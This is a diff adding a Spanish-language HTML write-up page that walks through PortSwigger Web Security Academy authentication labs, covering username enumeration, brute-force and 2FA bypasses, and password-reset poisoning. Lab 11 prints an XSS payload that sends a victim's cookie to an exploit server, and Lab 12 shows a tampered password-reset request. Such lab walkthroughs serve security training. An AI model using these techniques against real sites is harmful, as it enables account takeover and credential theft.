@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Authentication | PortSwigger · cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <style>
+    .code-block { background:#0a0a0a; border:1px solid #333; border-radius:6px; padding:1rem; overflow-x:auto; color:#9fef00; font-size:0.85rem; }
+  </style>
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <div class="d-flex gap-2">
+        <a href="../writeups.html#portswigger" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> PortSwigger</a>
+        <a href="../writeups.html" class="btn btn-sm btn-outline-secondary"><i class="bi bi-house"></i> Inicio</a>
+      </div>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="mb-4 p-4 rounded" style="background:#111;border:1px solid #222">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge fs-6" style="background:#ff6633">PortSwigger</span>
+        <span class="badge bg-warning text-dark fs-6">Authentication</span>
+        <span class="badge bg-secondary">Brute Force</span>
+        <span class="badge bg-secondary">2FA Bypass</span>
+        <span class="badge bg-secondary">Password Reset</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Authentication</h1>
+      <p class="text-secondary mb-0">Vulnerabilidades en mecanismos de autenticación: fuerza bruta, bypass de 2FA, reset de contraseñas y stay-logged-in cookies.</p>
+    </div>
+
+    <!-- Vulnerabilities in password-based login -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-key"></i> Vulnerabilities in password-based login</h3>
+
+    <h4 class="text-warning mt-3 mb-2">Brute Force Attacks</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 1</span>Username enumeration via different responses</h5>
+      <p class="text-secondary">Interceptar la consulta de login con Burp Suite, enviar al Intruder. Configurar tipo <strong>Sniper</strong>, seleccionar solo el usuario. Cargar lista de usuarios de PortSwigger. En <code>Grep - Extract</code> buscar <code>Invalid username</code>. Los resultados que digan <em>Invalid password</em> son los correctos.</p>
+      <img src="../img/auth1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth1.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth1.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth1.3.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth1.4.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 2</span>Username enumeration via subtly different responses</h5>
+      <p class="text-secondary">Mismo proceso que Lab 1. Las respuestas parecen iguales (<code>Invalid username or password.</code>) pero cuando el usuario existe no tiene el punto final. Luego fuerza bruta de contraseña buscando redirección o ausencia de mensaje de error.</p>
+      <img src="../img/auth2.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth2.2.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 3</span>Username enumeration via response timing</h5>
+      <p class="text-secondary">Agregar cabecera <code>X-Forwarded-For</code> con IP para evitar bloqueo. Password muy larga para que el procesamiento demore cuando el usuario existe. Tipo de ataque <strong>Pitchfork</strong> con dos listas: últimos dígitos de IP y nombres de usuario. Ver columna <strong>Response received</strong> para el tiempo.</p>
+      <img src="../img/auth3.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth3.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth3.3.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <h4 class="text-warning mt-3 mb-2">Flawed brute-force protection</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 4</span>Broken brute-force protection, IP block</h5>
+      <p class="text-secondary">La IP se bloquea cada 1 minuto. Usar ataque <strong>Pitchfork</strong> intercalando credenciales válidas (<code>wiener:peter</code>) con las de <code>carlos</code> para resetear el contador. Buscar código 302 para el usuario carlos.</p>
+      <img src="../img/auth4.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth4.2.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 5</span>Username enumeration via account lock</h5>
+      <p class="text-secondary">Usar tipo <strong>Cluster Bomb</strong>. Payload 1: lista de usuarios. Payload 2: lista simple con valores nulos (agregar vacío). El usuario con mayor longitud de respuesta es el correcto. Luego buscar contraseña esperando ausencia de mensaje de error.</p>
+      <img src="../img/auth5.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth5.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth5.4.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <h4 class="text-warning mt-3 mb-2">User rate limiting</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 6</span>Broken brute-force protection, multiple credentials per request</h5>
+      <p class="text-secondary">La consulta envía datos como JSON. Modificar el parámetro <code>password</code> para que sea un array de strings con todas las contraseñas posibles.</p>
+      <img src="../img/auth6.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth6.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth6.3.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <!-- Multi-factor authentication -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-shield-lock"></i> Vulnerabilities in multi-factor authentication</h3>
+
+    <h4 class="text-warning mt-3 mb-2">Bypassing two-factor authentication</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 7</span>2FA simple bypass</h5>
+      <p class="text-secondary">Ingresar con <code>wiener:peter</code>, obtener el código 2FA, entrar a <strong>My profile</strong> y copiar el URL. Cerrar sesión, ingresar con <code>carlos:montoya</code>. Cuando pida el segundo factor, navegar directamente al URL copiado.</p>
+    </section>
+
+    <h4 class="text-warning mt-3 mb-2">Flawed two-factor verification logic</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 8</span>2FA broken logic</h5>
+      <p class="text-secondary">Iniciar sesión con <code>wiener:peter</code> interceptando. Modificar <code>verify=carlos</code> para enviar el segundo factor a carlos. Mandar al Intruder con <code>verify=carlos</code> y hacer fuerza bruta del código de 4 dígitos. Buscar código 302.</p>
+      <img src="../img/auth8.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth8.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth8.3.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth8.4.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth8.5.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth8.6.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth8.7.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth8.8.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <h4 class="text-warning mt-3 mb-2">Brute-forcing 2FA verification codes</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 9</span>2FA bypass using a brute-force attack</h5>
+      <p class="text-secondary">Configurar una macro en <strong>Project Options → Sessions → Session Handling Rules</strong> con las 3 consultas de login (login page, credentials, 2FA page). La última consulta (envío del código) se usa para fuerza bruta en Intruder. Usar un solo hilo para evitar errores de sesión.</p>
+      <img src="../img/auth9.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.3.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.4.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.5.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.6.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.7.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.8.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.9.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.10.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth9.11.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <!-- Other authentication mechanisms -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-cookie"></i> Vulnerabilities in other authentication mechanisms</h3>
+
+    <h4 class="text-warning mt-3 mb-2">Keeping users logged in</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 10</span>Brute-forcing a stay-logged-in cookie</h5>
+      <p class="text-secondary">La cookie <code>stay-logged-in</code> usa el formato <code>base64(user:MD5(password))</code>. En el Intruder usar la cookie stay-logged-in con Payload Processing: Hash MD5 → Prefix <code>carlos:</code> → Encode Base64.</p>
+      <pre class="code-block"><code>$ echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d
+wiener:51dc30ddc473d43a6011e9ebba6ca770
+
+$ hashid 51dc30ddc473d32a6011e92bba6ca770
+[+] MD5</code></pre>
+      <img src="../img/auth10.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth10.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth10.3.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth10.4.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth10.5.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 11</span>Offline password cracking</h5>
+      <p class="text-secondary">La caja de comentarios es vulnerable a XSS. Inyectar payload para exfiltrar la cookie de carlos al servidor de exploit. Decodificar la cookie <code>stay-logged-in</code> y crackear el hash MD5 con CrackStation. Luego eliminar la cuenta de carlos.</p>
+      <pre class="code-block"><code>&lt;script&gt;document.location='https://exploit-SERVER.web-security-academy.net/exploit/'+document.cookie&lt;/script&gt;</code></pre>
+      <img src="../img/auth11.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth11.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth11.3.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <!-- Resetting user passwords -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-arrow-counterclockwise"></i> Resetting user passwords</h3>
+
+    <h4 class="text-warning mt-3 mb-2">Resetting passwords using a URL</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 12</span>Password reset broken logic</h5>
+      <p class="text-secondary">Usar <strong>Forgot Password?</strong> con el correo de wiener. Interceptar la consulta al enviar la nueva contraseña y cambiar el parámetro <code>username=carlos</code>.</p>
+      <pre class="code-block"><code>temp-forgot-password-token=TOKEN&amp;username=carlos&amp;new-password-1=miau12345&amp;new-password-2=miau12345</code></pre>
+      <img src="../img/auth12.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth12.2.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 13</span>Password reset poisoning via middleware</h5>
+      <p class="text-secondary">Usar <strong>Forgot password</strong> para <code>carlos</code> interceptando el paquete. Agregar la cabecera <code>X-Forwarded-Host</code> con el servidor de exploit. El token llegará a los logs del servidor exploit. Usar ese token para resetear la contraseña de carlos.</p>
+      <img src="../img/auth13.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth13.2.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <!-- Changing user passwords -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-pencil-square"></i> Changing user passwords</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 14</span>Password brute-force via password change</h5>
+      <p class="text-secondary">El formulario de cambio de contraseña envía el nombre de usuario en un hidden input. Si las nuevas contraseñas no coinciden pero la actual es correcta, retorna <code>New passwords do not match</code>. Hacer fuerza bruta del campo <code>current-password</code> buscando esa respuesta.</p>
+      <img src="../img/auth14.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth14.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth14.3.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="../img/auth14.4.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
